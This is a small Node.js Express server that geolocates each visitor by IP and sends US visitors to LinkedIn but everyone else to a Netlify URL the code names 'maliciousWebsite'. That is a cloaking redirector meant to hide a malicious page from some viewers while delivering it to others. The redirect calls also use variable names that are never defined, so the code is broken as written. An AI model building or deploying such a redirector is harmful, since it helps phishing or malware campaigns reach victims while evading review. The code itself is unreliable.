const express = require('express');
const axios = require('axios');
const requestIp = require('request-ip');

const app = express();
const port = 3000;


const realWebsite = "https://www.linkedin.com/feed/"
const maliciousWebsite = "https://adorable-mandazi-8f986f.netlify.app/"


app.use(requestIp.mw());

app.get('/', async (req, res) => {
  const userIP = req.clientIp;

  try {
    const response = await axios.get(`http://ip-api.com/json/${userIP}`);
    const data = response.data;

    if (data.countryCode === 'US') {
      res.redirect(siteReal);
    } else {
      res.redirect(siteMalicioso);
    } 
  } catch (error) {
    console.error(error.message);
    res.status(500).send('Erro ao obter informações de localização.');
  }
});

app.listen(port, () => {
  console.log(`Servidor está rodando em http://localhost:${port}`);
});
